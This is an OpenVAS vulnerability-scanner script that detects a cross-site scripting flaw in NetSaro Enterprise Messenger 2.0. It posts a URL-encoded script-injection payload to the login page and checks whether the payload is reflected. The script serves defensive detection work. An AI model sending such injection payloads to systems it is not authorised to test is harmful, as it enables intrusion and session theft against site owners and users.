###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netsaro_49390.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# NetSaro Enterprise Messenger Cross Site Scripting and HTML Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103236");
  script_version("$Revision: 12018 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-01 14:04:12 +0200 (Thu, 01 Sep 2011)");
  script_bugtraq_id(49390);
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_name("NetSaro Enterprise Messenger Cross Site Scripting and HTML Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49390");
  script_xref(name:"URL", value:"http://www.netsaro.com/");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 4990);

  script_tag(name:"impact", value:"Successful exploits will allow attacker-supplied HTML and script
 code to run in the context of the affected browser, potentially
 allowing the attacker to steal cookie-based authentication
 credentials or to control how the site is rendered to the user.
 Other attacks are also possible.");
  script_tag(name:"affected", value:"NetSaro Enterprise Messenger 2.0 is vulnerable. Other versions may
 also be affected.");
  script_tag(name:"summary", value:"NetSaro Enterprise Messenger is prone to multiple cross-site
 scripting and HTML-injection vulnerabilities because it fails to
 properly sanitize user-supplied input before using it in dynamically
 generated content.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


port = get_http_port(default:4990);

rcvRes = http_get_cache(item:"/", port:port);

if("<title>NetSaro Administration Console</title>" >!< rcvRes)exit(0);

host = http_host_name(port:port);

req = string("POST /login.nsp HTTP/1.1\r\n",
	     "Host: ", host,"\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "Content-Length: 131\r\n",
	     "\r\n",
	     "username=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28%22openvas-xss-test%22%29%3C%2Fscript%3E&password=&login=Log+In&postback=postback\r\n",
	     "\r\n");

rcvRes = http_keepalive_send_recv(port:port, data:req);

if(rcvRes =~ "HTTP/1\.. 200" && '"></script><script>alert("openvas-xss-test")</script>"' >< rcvRes)  {

  security_message(port:port);
  exit(0);

}

exit(99);
